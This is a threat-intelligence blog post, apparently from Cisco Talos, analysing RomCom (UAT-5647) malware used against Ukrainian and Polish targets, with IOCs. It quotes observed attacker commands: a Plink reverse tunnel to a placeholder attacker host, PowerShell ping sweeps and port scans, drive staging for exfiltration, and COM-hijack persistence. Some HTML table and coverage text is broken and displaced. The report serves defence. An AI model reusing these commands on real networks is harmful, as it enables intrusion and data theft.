<article class="post tag-apt tag-ukraine tag-malware tag-russia featured ">

    <h1 class="text-center">UAT-5647 targets Ukrainian and Polish entities with RomCom malware variants</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/dmytro/">Dmytro Korzhevin</a>, 
                <a href="https://blog.talosintelligence.com/author/asheer-malhotra/">Asheer Malhotra</a>, 
                <a href="https://blog.talosintelligence.com/author/vanja-svajcer/">Vanja Svajcer</a>, 
                <a href="https://blog.talosintelligence.com/author/vitor-ventura/">Vitor Ventura</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="October 17, 2024 06:00">
            Thursday, October 17, 2024 06:00
        </time>

        <div class="m-3">
                            <a href="/category/apt/" class="category primary-category">
                                APT
                            </a>
                                                    <a href="/category/ukraine/" class="category primary-category">
                                Ukraine
                            </a>
                                                    <a href="/category/malware/" class="category primary-category">
                                malware
                            </a>
                                                    <a href="/category/russia/" class="category primary-category">
                                Russia
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <p></p><ul><li>Cisco Talos has observed a new wave of attacks active since at least late 2023, from a Russian speaking group we track as “UAT-5647”, against Ukrainian government entities and unknown Polish entities.&nbsp;</li><li>UAT-5647 is also known as&nbsp; <strong>RomCom </strong>and is widely attributed to Russian speaking threat actors in <a href="https://www.microsoft.com/en-us/security/blog/2023/07/11/storm-0978-attacks-reveal-financial-and-espionage-motives/" rel="noreferrer noopener"><u>open-source reporting.</u></a>&nbsp;&nbsp;</li><li>The latest series of attacks deploys an updated version of the <a href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" rel="noreferrer noopener"><u>RomCom</u></a> malware we track as “<strong>SingleCamper</strong>”. This version is loaded directly from registry into memory and uses loopback address to communicate with its loader.</li><li>UAT-5647 has also evolved their tooling to include four distinct malware families: two downloaders we track as RustClaw and MeltingClaw; a RUST-based backdoor we call DustyHammock; and a C++ based backdoor we call ShadyHammock.</li><li>During its lateral movement, the threat actor attempted to compromise edge devices by tunneling internal interfaces to external, remote hosts controlled by UAT-5647. If successful, it would have higher chances of evading detection during the incident response process.&nbsp;</li></ul><p></p><p>UAT-5647 has long been considered a multi-motivational threat actor performing both ransomware and espionage-oriented attacks. However, UAT-5647 has accelerated their attacks in recent months with a clear focus on establishing long–term access for exfiltrating data of strategic interest to them. Our assessment, in line with recent reporting from <a href="https://cert.gov.ua/article/6280099" rel="noreferrer noopener"><u>CERT-UA</u></a> and <a href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" rel="noreferrer"><u>Palo Alto Networks</u></a>, indicates that the threat actor is aggressively expanding their tooling and infrastructure to support a wide variety of malware components authored in diverse languages and platforms such as GoLang, C++, RUST and LUA. &nbsp;</p><p>Talos further assesses that this specific series of attacks, targeting high profile Ukrainian entities, is likely meant to serve UAT-5647's two-pronged strategy in a staged manner – establish long-term access and exfiltrate data for as long as possible to support espionage motives, and then potentially pivot to ransomware deployment to disrupt and likely financially gain from the compromise. It is also likely that Polish entities were also targeted, based on the keyboard language checks performed by the malware.</p><h2 id="uat-5647-infection-chain">UAT-5647 infection chain&nbsp;</h2><p>The infection chain consists of a spear-phishing message delivering a downloader consisting of either of two variants: “RustyClaw” – a RUST-based downloader, and a C++ based variant we track as “MeltingClaw”. The downloaders make way for and establish persistence for two distinct backdoors we call “DustyHammock” and “ShadyHammock,” respectively. &nbsp;</p><p>DustyHammock is a more straightforward backdoor meant to be the core malicious component of the infection communicating with its command and control (C2) and performing malicious actions. ShadyHammock is, however, a two-pronged backdoor responsible for loading and activating the SingleCamper implant (RomCom malware variant) on an infected system and optionally listening for incoming commands from another malicious component.&nbsp;</p><p>The overall infection chain can be visualized as:&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/10/data-src-image-6ebff3bc-34e7-47c9-b156-2995d59c63ba.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="943" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/10/data-src-image-6ebff3bc-34e7-47c9-b156-2995d59c63ba.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/10/data-src-image-6ebff3bc-34e7-47c9-b156-2995d59c63ba.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/10/data-src-image-6ebff3bc-34e7-47c9-b156-2995d59c63ba.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><p>&nbsp;</p><p></p><h1 id="uat-5647s-post-compromise-activity">UAT-5647's post-compromise activity&nbsp;</h1><p>The post-compromise activity by UAT-5647 is standard to what we would expect for a threat actor whose primary motivation is espionage. There is however one set of actions that stand out. It is our assessment that at some point the threat actor started targeting the edge devices, from inside the compromised network. This and other activities are detailed in the following sub-sections.&nbsp;</p><h2 id="tunneling-into-the-enterprise">Tunneling into the enterprise&nbsp;</h2><p>Once preliminary network reconnaissance was completed, UAT-5647 downloaded PuTTY’s Plink tool to establish remote tunnels between accessible endpoints and attacker-controlled servers [<a href="https://attack.mitre.org/techniques/T1572/" rel="noreferrer noopener"><u>T1572</u></a>]. While this is a common practice, one of the configurations was mapping the internal admin port of an edge device.</p>
<!--kg-card-begin: html-->
<pre>
cmd /C %public%\pictures\iestatus[.]exe -pw _passwd_ -batch -hostkey SHA256:_KEY_ -N -R 8080:_IP_IN_INFECTED_NETWORK_:80 root@_ATTACKERS_REMOTE_IP_ -P 7722 
  
</pre>
<!--kg-card-end: html-->
<p></p><p>Any traffic sent to Port 8088 on the attacker-controlled remote server will be forwarded to Port 80 on (&lt;IP_IN_INFECTED_NETWORK&gt;)<strong>.</strong> This technique effectively exposes the application on Port 80 to the attackers allowing them to:&nbsp;</p><ul><li>Brute force or password spray to gain access to the service.&nbsp;</li><li>Monitor and exfiltrate data and configuration from the application once access has been achieved.&nbsp;</li></ul><p>Based on URLs exposed to the threat actors now on Port 8088 such as “hxxp[://]193[.]42[.]36[.]131:8088/help/LanArpBindingListHelpRpm[.]htm”, “userRpm/VirtualServerRpm.htm”, and Censys data, it is likely that the &lt;IP_IN_INFECTED_NETWORK&gt; IP address is a “TP-LINK Wireless G Router WR340G”.</p><p></p><h2 id="uat-5647%E2%80%99s-lateral-movement-and-system-discovery">UAT-5647’s lateral movement and system discovery&nbsp;</h2><p>The threat actors were particularly interested in network reconnaissance, evident from the repeated ping sweeps they carried out to find adjoining systems [<a href="https://attack.mitre.org/techniques/T1016/" rel="noreferrer noopener"><u>T1016</u></a>]:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
powershell command 1..254 | % {ping n 1 a w 100 192.168.0.$_} | SelectString \[ 
</pre>
<!--kg-card-end: html-->
<p></p><p>Once UAT-5647 deemed a specific system on the network as interesting, they can take one of two actions:&nbsp;</p><p>Based on the results of the ping sweep (ICMP sweep), UAT-5647 created and executed a customized batch (BAT) file named “nv[.]bat”. The BAT file is used to run “net view” to obtain a list of shares exposed on specific IPs [<a href="https://attack.mitre.org/techniques/T1135/" rel="noreferrer noopener"><u>T1135</u></a>]: &nbsp;</p>
<!--kg-card-begin: html-->
<pre>
net view /all [\][\]192[.]168[.]XXX[.]XXX  
net view /all [\][\]192[.]168[.]XXX[.]XXX  
net view /all [\][\]192[.]168[.]XXX[.]XXX  
net view /all [\][\]192[.]168[.]XXX[.]XXX 
</pre>
<!--kg-card-end: html-->
<p></p><p>UAT-5647 further pinged additional endpoints in the network, this time however using their hostnames and specific IPs [<a href="https://attack.mitre.org/techniques/T1016/" rel="noreferrer noopener"><u>T1016</u></a>]:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
ping -n 1 &lt;IP&gt; 
ping -n 1 &lt;hostname&gt;
</pre>
<!--kg-card-end: html-->
<p></p><p>A successful response from the system leads to shared folder reconnaissance [<a href="https://attack.mitre.org/techniques/T1135/" rel="noreferrer noopener"><u>T1135</u></a>]:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
dir [\][\]192[.]168[.]0[.]XXX\c$ 
dir [\][\]&lt;hostname&gt;\c$ 
</pre>
<!--kg-card-end: html-->
<p></p><p>They began to run highly specific port scans on it, likely to find means of obtaining unauthorized access to it:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
powershell  -c $ips = @("&lt;IP_ADDRESS&gt;”); $ports = @("22", "80", "443"); foreach ($ip in $ips) { foreach ($port in $ports) { if ((New-Object Net[.]Sockets[.]TcpClient)[.]Connect($ip, $port)) { "$[OPEN] $ip $port" | Out-File -Append "c:\users\public\music\log[.]txt" } } } 
</pre>
<!--kg-card-end: html-->
<p></p><p>Later the threat actor expanded their port scans to other IP address in the network:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
powershell -Command $ips = @(" &lt;IP_ADDRESS&gt;", "&lt;IP_ADDRESS&gt;", ...., "&lt;IP_ADDRESS&gt;", "&lt;IP_ADDRESS&gt;"); $ports = @("22", "80", "443", "445"); $output = "c:\users\public\music\log[.]txt"; foreach ($ip in $ips) { foreach ($port in $ports) { $result = Test-NetConnection -ComputerName $ip Port $port; "$ip  $port : $($result[.]TcpTestSucceeded)" | OutFile Append $output } } 
</pre>
<!--kg-card-end: html-->
<p></p><h2 id="system-and-user-discovery">System and user discovery&nbsp;</h2><p>Even though the C2 may have automatically issued a limited set of commands to the last-stage implants, the attackers open a reverse shell (via cmd[.]exe) to conduct further reconnaissance. This activity primarily consists of user and system discovery tasks:</p>
<!--kg-card-begin: html-->
<table class="Table Ltr TableWordWrap SCXW204237814 BCX0" border="1" data-tablestyle="MsoTableGrid" data-tablelook="1696" aria-rowcount="8" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; <!--kg-card-end: html-->
<p></p><h2 id="data-exfiltration-activity">Data exfiltration activity&nbsp;</h2><p>In parallel, we also observed the operators attempting to stage entire drives for exfiltration from the infected system [<a href="https://attack.mitre.org/techniques/T1560/" rel="noreferrer noopener"><u>T1560</u></a>]:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
powershell -c Compress-Archive -Path d:\ -DestinationPath C:\Users\&lt;user&gt;\Documents\d.zip
</pre>
<!--kg-card-end: html-->
<p></p><p>However, they also collected specific folders on disk too. In this specific case the threat actor is exfiltrating the “Recent” folder in, what seems, an attempt to understand the victim’s latest activity on the system.&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
cmd /C powershell -c Compress-Archive -Path c:\users\&lt;users&gt;\appdata\Roaming\microsoft\Windows\Recent\ -DestinationPath c:\users\public\music\recent.zip 
</pre>
<!--kg-card-end: html-->
<p></p><p></p><h1 id=""></h1><h1 id="rustyclaw-leads-to-dustyhammock">RustyClaw leads to DustyHammock&nbsp;</h1><p>RustyClaw is a RUST-based malware downloader that is targeted towards Polish, Ukrainian or Russian speaking users. The malware checks the Keyboard Layout to match one of the following language codes, before proceeding with its malicious activities:&nbsp;</p><ul><li>415 – Polish&nbsp;</li><li>422 – Ukrainian&nbsp;</li><li>419 – Russian&nbsp;</li><li>2000 – Unknown&nbsp;</li></ul><p>&nbsp;</p><p>RustyClaw will then generate a hash for its file name to match it with a hardcoded value – this is an anti-analysis feature to prevent malware from running in sandboxes with randomized names.&nbsp;</p><p>Once the checks have passed, the downloader will optionally download a decoy PDF to display to the infected user and then download the next-stage implant, DustyHammock, to locations on disk such as:&nbsp;</p><p>C:\Users\&lt;user&gt;\AppData\Local\KeyStore\keyprov.dll&nbsp;</p><p>Then the following registry values are set to the path of the next-stage payload (keyprov[.]dll):&nbsp;</p><p>HKCU\SOFTWARE\Classes\CLSID\{2155fee3-2419-4373-b102-6843707eb41f}\InprocServer32&nbsp;</p><p>This GUID is the CLISD for “CLSID_LocalIconCache”, that is the ThumbCache entry. It is used by explorer[.]exe while rendering the thumbnails for file icons.&nbsp;</p><p>The downloader will then restart the explorer[.]exe process to load the next-stage payload DLL, DustyHammock, effectively trojanizing the process:&nbsp;</p><p>cmd /C timeout 3 &amp;&amp; taskkill /f /im explorer.exe &amp;&amp; start explorer.exe&nbsp;</p><p></p><p></p><h1 id="-1"></h1><h1 id="dustyhammock-%E2%80%93-uat-5647s-latest-backdoor">DustyHammock – UAT-5647's latest backdoor&nbsp;</h1><p>DustyHammock is another RUST-based backdoor. It is configured to run preliminary, hardcoded, reconnaissance commands on the infected system, gather their outputs, and send the information to its C2. The C2 then begins responding with tasks to perform on the infected system. The preliminary information collected is the MAC addresses, windows version information, and computer\username via the “whoami” and “chcp” commands.&nbsp;</p><p>The backdoor has the following capabilities:&nbsp;</p><ul><li>Run arbitrary commands on the infected endpoint.&nbsp;</li><li>Download and place files from the C2 to the infected system.&nbsp;</li><li>Connect to an <a href="https://docs.ipfs.tech/concepts/ipns/" rel="noreferrer noopener"><u>IPNS CID</u></a> – likely done to download additional payloads to the infected system. The CID access by the backdoor is “/ipns/k51qzi5uqu5dgn9wgsaxb7cfvinmk27eusoufaxrp8qd1ri5kamf41bg7gpydm”.&nbsp;</li></ul><p>InterPlanetary File System (IPFS) is a peer-to-peer network allowing resource hosting in a decentralized manner. InterPlanetary Name System (IPNS), a feature of IPFS, enables mutable referencing of resources hosted on IPFS networks, allowing uploaders to modify the content of the resource without changing its identifier (CID).&nbsp;</p><p>&nbsp;Note that although similar in names, DustyHammock and ShadyHammock are in fact distinct implant families. ShadyHammock is coded in C++ and contains additional capabilities to bind itself and listen for incoming requests – a capability missing in DustyHammock. Although ShadyHammock consists of more features, DustyHammock seems to be the successor to it and was used as recently as September 2024 by UAT-5647. UAT-5647 likely decided to abandon additional components such as SingleCamper (loaded by ShadyHammock) in favor of a single last-stage implant, DustyHammock.&nbsp;</p><p></p><p></p><h1 id="-2"></h1><h1 id="meltingclaw-leads-to-shadyhammock">MeltingClaw leads to ShadyHammock&nbsp;</h1><p>MeltingClaw is the second malware downloader UAT-5647 has used in this series of attacks. It is similar in behavior to RustyClaw with varying configurations such as file names and locations. The next-stage payload, ShadyHammock, is dropped to a similar location such as:&nbsp;</p><p>C:\Users\&lt;user&gt;\AppData\Local\AppTemp\libapi.dll&nbsp;</p><p>&nbsp;</p><p>This DLL is loaded into explorer[.]exe by specifying it in the registry key:&nbsp;</p><p>HKEY_USERS\S-1-..-CLASSES\CLSID\{F82B4EF1-93A9-4DDE-8015-F7950A1A6E31}\InprocServer32\&nbsp;</p><p>This GUID is the “Sync Registration” COM interface and is loaded into explorer[.]exe as well.&nbsp;</p><p>&nbsp;Apart from these capabilities that are common with RustyClaw, MeltingClaw will also download and store additional payloads in the Windows registry:&nbsp;</p><p>HKEY_CURRENT_USER\Software\AppDataSoft\Software\&nbsp;</p><p>&nbsp;</p>

-webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; font-size: 12pt; line-height: 18px; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSCustomFont, Aptos_MSFontService, sans-serif; color: rgb(0, 0, 0);">&nbsp;</span></p></div></div></td><td class="LastCol LastRow SCXW195089165 BCX0" data-celllook="0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; overflow: visible; vertical-align: top; position: relative; background-color: transparent; background-clip: padding-box; border: 1px solid rgb(0, 0, 0); width: 311px;"><div class="TableCellContent SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px 7px; user-select: text; overflow: visible;"><div class="OutlineElement Ltr SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; clear: both; cursor: text; overflow: visible; position: relative; direction: ltr;"><p class="Paragraph SCXW195089165 BCX0" paraid="415937518" paraeid="{8de7cbb3-e8a5-4567-adef-3ca7d256ca82}{16}" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; overflow-wrap: break-word; white-space: pre-wrap; font-weight: normal; font-style: normal; vertical-align: baseline; font-kerning: none; background-color: transparent; color: windowtext; text-align: left; text-indent: 0px;"><span data-contrast="none" xml:lang="EN-US" lang="EN-US" class="TextRun SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; font-variant-ligatures: none !important; color: rgb(0, 0, 0); font-size: 12pt; line-height: 18px; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSCustomFont, Aptos_MSFontService, sans-serif;"><span class="NormalTextRun SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text;">The implant version for the downloader.</span></span><span class="LineBreakBlob BlobObject DragDrop SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; font-size: 12pt; line-height: 18px; font-family: WordVisiCarriageReturn_MSFontService, Aptos, Aptos_EmbeddedFont, Aptos_MSCustomFont, Aptos_MSFontService, sans-serif; color: rgb(0, 0, 0);"><span class="SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; white-space: pre !important;">&nbsp;</span><br class="SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; white-space: pre !important;"></span><span data-contrast="none" xml:lang="EN-US" lang="EN-US" class="TextRun SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; font-variant-ligatures: none !important; color: rgb(0, 0, 0); font-size: 12pt; line-height: 18px; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSCustomFont, Aptos_MSFontService, sans-serif;"><span class="NormalTextRun SCXW195089165 BCX0" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text;">“UPDE&lt;number&gt;”</span></span><span class="EOP SCXW195089165 BCX0" data-ccp-props="{}" style="-webkit-user-drag: none; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; user-select: text; font-size: 12pt; line-height: 18px; font-family: Aptos, Aptos_EmbeddedFont, Aptos_MSCustomFont, Aptos_MSFontService, sans-serif; color: rgb(0, 0, 0);">&nbsp;</span></p></div></div></td></tr></tbody></table>
<!--kg-card-end: html-->
<p>&nbsp;</p><p>These payloads are then loaded and activated by ShadyHammock via explorer[.]exe as illustrated next. One of the payloads is a new variant of the RomCom backdoor, we track as “SingleCamper”. The other payload is currently unknown.&nbsp;</p><p></p><p></p><h1 id="-3"></h1><h1 id="shadyhammock-%E2%80%93-a-two-pronged-backdoor">ShadyHammock – a two-pronged backdoor&nbsp;</h1><p>ShadyHammock is a simple and effective backdoor that carries out two primary tasks:&nbsp;</p><ul><li>Load and run payloads placed in certain registry locations (by its parent MeltingClaw).&nbsp;</li><li>Bind to localhost and listen for incoming commands from a separate malicious component.&nbsp;</li></ul><p>&nbsp;</p><p></p><p></p><h1 id="-4"></h1><h2 id="shadyhammock%E2%80%99s-load-and-run-capability-leads-to-singlecamper">ShadyHammock’s load-and-run capability leads to SingleCamper&nbsp;</h2><p>The malware will read registry locations, specifically in location:&nbsp;</p><p>HKEY_CURRENT_USER\Software\AppDataSoft\Software\&nbsp;</p><p>There are usually three values in this registry key, two containing encoded copies of next stage payloads and the third containing configuration specific data such as the implant’s versions.&nbsp;</p><p>The binary content of these registry values is read and decoded, resulting in a DLL that is simply traversed to find the export function. The resulting DLLs are loaded into memory to carry out more malicious activities. So far Talos has only discovered one DLL-based payload from registry, that we track as “<strong>SingleCamper</strong>”. SingleCamper, a new version of the RomCom malware, was also recently disclosed in Palo Alto’s report as <a href="https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/" rel="noreferrer noopener"><u>SnipBot</u></a>. &nbsp;</p><p>The other payload is yet to be discovered (usually in the “trem2” or “state2” registry values). However, ShadyHammock already has the capability to deploy this payload on-demand provided that a specific command code is sent to it via the endpoint’s localhost interface.&nbsp;</p><p>&nbsp;</p><p></p><p></p><h1 id="-5"></h1><h2 id="shadyhammock-can-accept-commands-from-singlecamper">ShadyHammock can accept commands from SingleCamper&nbsp;</h2><p>ShadyHammock also consists of the ability to bind to a specific port (such as 1342) on localhost (127[.]0[.]0[.]1). Binding to localhost does not allow it to listen for incoming requests from remote hosts and is a mechanism to communicate with SingleCamper.&nbsp;</p><p>&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/10/data-src-image-d8851626-1d28-4f46-ac63-481b062fa756.png" class="kg-image" alt="" loading="lazy" width="551" height="255"></figure><p>&nbsp;</p><p>ShadyHammock listening on Port 1342&nbsp;</p><p>&nbsp;</p><p>ShadyHammock will listen for specific command phrases based on which it performs specific actions. These actions consist of:&nbsp;</p><ul><li>“<strong>delete bot</strong>”: Issuing this command will result in the backdoor being deleted from the infected host. The backdoor will delete all registry keys and folders associated with it and then restart explorer[.]exe to execute a benign, non-trojanized copy of the process.&nbsp;</li><li>“<strong>update bot work</strong>” or “<strong>start bot file</strong>”: these commands instruct the backdoor to decode and load the payload stored in the second registry value that may have been created by MeltingClaw - “trem2” or “state2”.&nbsp;</li></ul><p>These commands are in fact issued to ShadyHammock by SingleCamper (RomCom). SingleCamper’s C2 server will issue a specific command code to it based on which the malware will generate the command phrase such as “delete bot” and send it to ShadyHammock via the localhost interface.&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/10/data-src-image-19c1732e-cbb4-4650-8aea-c8f20f422abb.png" class="kg-image" alt="" loading="lazy" width="481" height="626"></figure><p>&nbsp;</p><p>SingleCamper issuing commands to ShadyHammock via localhost&nbsp;</p><p>&nbsp;</p><h1 id="singlecamper-%E2%80%93-an-update-to-romcom">SingleCamper – an update to RomCom&nbsp;</h1><p>SingleCamper is the key implant in this infection that carries out all of the malicious post-compromise activities. It is loaded by ShadyHammock after being read and decoded from the Windows registry.&nbsp;</p><p>SingleCamper consists of the following capabilities:&nbsp;</p><ul><li>Send preliminary system information to the C2 for registering the infection. The data is sent over Port 443 &nbsp;(HTTPS) in format:&nbsp;</li></ul><p>&lt;MAC_ADDRESS&gt;@RDPE1@@exist:&lt;BLAH&gt;-0:US:RDPE1:\:&lt;OEM_CP_VALUE&gt;:&nbsp;</p><ul><li>Execute preliminary reconnaissance commands sent by the C2 and respond with the results such as:&nbsp;<ul><li>nltest /domain_trusts&nbsp;</li><li>systeminfo&nbsp;</li><li>ipconfig /all&nbsp;</li><li>dir C:\"program Files" C:\"Program Files (x86)" C:\Users&nbsp;</li></ul></li></ul><p>&nbsp;</p><ul><li>Based on the information received by the C2, the attackers decided whether the infected system is worth exploring further and carrying out post-compromise activities. Therefore, any commands executed by SingleCamper after these preliminary commands may be human operator issued commands.&nbsp;</li></ul><p></p><ul><li>Receive command codes and accompanying data from the C2 and perform malicious actions on the infected system such as system information, download of additional payloads (such as PuTTY’s Plink), enumerate processes, enumerate and exfiltrate files with specific extensions such as: txt, rtf, xls, xlsx, ods, cmd, pdf, vbs, ps1, one, kdb, kdbx, doc, docx, odt, eml, msg, email.&nbsp;</li></ul><p></p><ul><li>SingleCamper can also send commands to its loader, ShadyHammock, to perform actions on the infected endpoint. Actions include deleting the infection and loading another payload from registry – the same way ShadyHammock loads SingleCamper.&nbsp;</li></ul><p>&nbsp;</p><p></p><p></p><h1 id="-6"></h1><h1 id="coverage">Coverage&nbsp;</h1><p>Ways our customers can detect and block this threat are listed below.&nbsp;</p><p>&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/10/data-src-image-d72adcc0-a28c-4ef7-917a-9f68b8eaa385.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="323" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/10/data-src-image-d72adcc0-a28c-4ef7-917a-9f68b8eaa385.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/10/data-src-image-d72adcc0-a28c-4ef7-917a-9f68b8eaa385.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/10/data-src-image-d72adcc0-a28c-4ef7-917a-9f68b8eaa385.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><p>&nbsp;</p><p>&nbsp;<a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html?ref=cisco-talos-blog" rel="noreferrer noopener"><u>Cisco Secure Endpoint</u></a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. noopener"><u>Snort.org</u></a>.&nbsp;&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id="iocs">IOCs&nbsp;</h1><p>&nbsp;</p><p>IOCs for this research can also be found at our GitHub repository <a href="https://github.com/Cisco-Talos/IOCs/tree/main/2024/10" rel="noreferrer"><u>here</u></a>.&nbsp;</p><p>&nbsp;</p><h3 id="rustyclaw">RustyClaw&nbsp;</h3><p>12bf973b503296da400fd6f9e3a4c688f14d56ce82ffcfa9edddd7e4b6b93ba9&nbsp;<br>260a6644ab63f392d090853ccd7c4d927aba3845ced473e13741152cdf274bbd&nbsp;<br>9062d0f5f788bec4b487faf5f9b4bb450557e178ba114324ef7056a22b3fbe8b&nbsp;<br>43a15c4ee10787997682b79a54ac49a90d26a126f5eeeb8569022850a2b96057&nbsp;<br>aa09e9dca4994404a5f654be2a051c46f8799b0e987bcefef2b52412ac402105&nbsp;<br>585ed48d4c0289ce66db669393889482ec29236dc3d04827604cf778c79fda36&nbsp;<br>62f59766e62c7bd519621ba74f4d0ad122cca82179d022596b38bd76c7a430c4&nbsp;<br>9fd5dee828c69e190e46763b818b1a14f147d1469dc577a99b759403a9dadf04&nbsp;<br>b1fe8fbbb0b6de0f1dcd4146d674a71c511488a9eb4538689294bd782df040df&nbsp;<br>7602e2c1ae27e1b36ee4aed357e505f14496f63db29fb4fcdd0d8a9db067a5c4&nbsp;<br>f3fe04a7e8da68dc05acb7164b402ffc6675a478972cf624de84b3e2e4945b93&nbsp;<br>10e1d453d4f9ca05ff6af3dcd7766a17ca1470ee89ba90feee5d52f8d2b18a4c&nbsp;<br>a265ae8fed205efb5bcc2fb59e60f743f45b7ad402cb827bc98dee397069830c&nbsp;<br>8104fdf9ff6be096b7e5011e362400ee8dd89d829c608be21eb1de959404b4b9&nbsp;<br>b55f70467f13fbad6dde354d8653d1d6180788569496a50b06f2ece1f57a5e91&nbsp;<br>bd25618f382fc032016e8c9bc61f0bc24993a06baf925d987dcec4881108ea2a&nbsp;<br>78eaaf3d831df27a5bc4377536e73606cd84a89ea2da725f5d381536d5d920d8&nbsp;<br>88a4b39fb0466ef9af2dcd49139eaff18309b32231a762b57ff9f778cc3d2dd7&nbsp;<br>01ebc558aa7028723bebd8301fd110d01cbd66d9a8b04685afd4f04f76e7b80c&nbsp;<br>7c9775b0f44419207b02e531c357fe02f5856c17dbd88b3f32ec748047014df8&nbsp;<br>54ce280ec0f086d89ee338029f12cef8e1297ee740af76dda245a08cb91bab4d&nbsp;<br>bf5f2bdc3d2acbfb218192710c8d27133bf51c1da1a778244617d3ba9c20e6f7&nbsp;<br>fdbc6648c6f922ffcd2b351791099e893e183680fc86f48bf18815d8ae98a4f7&nbsp;<br>ac9e3bf1cc87bc86318b258498572793d9fb082417e3f2ff17050cf6ec1d0bb5&nbsp;<br>0a02901d364dc9d70b8fcdc8a2ec120b14f3c393186f99e2e4c5317db1edc889</p><p>&nbsp;</p><h3 id="dustyhammock">DustyHammock&nbsp;</h3><p>951b89f25f7d8be0619b1dfdcc63939b0792b63fa34ebfa9010f0055d009a2d3&nbsp;</p><p>&nbsp;</p><h3 id="putty-plink">PuTTY Plink&nbsp;</h3><p>2e338a447b4ceaa00b99d742194d174243ca82830a03149028f9713d71fe9aab&nbsp;</p><p>&nbsp;</p><h3 id="meltingclaw">MeltingClaw&nbsp;</h3><p>45adf6f32f9b3c398ee27f02427a55bb3df74687e378edcb7e23caf6a6f7bf2a&nbsp;<br>B9677c50b20a1ed951962edcb593cce5f1ed9c742bc7bff827a6fc420202b045</p><p>&nbsp;</p><h3 id="shadyhammock">ShadyHammock&nbsp;</h3><p>ce8b46370fd72d7684ad6ade16f868ac19f03b85e35317025511d6eeee288c64&nbsp;<br>9f635fa106dbe7181b4162266379703b3fdf53408e5b8faa6aeee08f1965d3a2&nbsp;<br>1fa96e7f3c26743295a6af7917837c98c1d6ac0da30a804fed820daace6f90b0</p><p>&nbsp;</p><h3 id="singlecamper">SingleCamper&nbsp;</h3><p>dee849e0170184d3773077a9e7ce63d2b767bb19e85441d9c55ee44d6f129df9<br>2474a6c6b3df3f1ac4eadcb8b2c70db289c066ec4b284ac632354e9dbe488e4d</p><p>&nbsp;</p><p>&nbsp;</p><h2 id="network-iocs">Network 